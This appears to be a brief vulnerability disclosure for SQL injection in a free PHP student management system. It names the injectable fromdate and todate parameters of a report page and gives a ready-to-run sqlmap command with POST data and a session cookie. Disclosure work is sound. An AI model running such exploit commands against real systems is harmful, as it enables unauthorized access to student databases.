vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $fromdate,$todate

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220947513-2d9d5c94-4f78-4c6c-87ce-90c45e8f3f82.png)


exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/between-date-reprtsdetails.php" --data "fromdate=1&todate=1" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```
![image](https://user-images.githubusercontent.com/30823782/220947570-39b73730-3594-4a32-aeec-6665e89751b9.png)

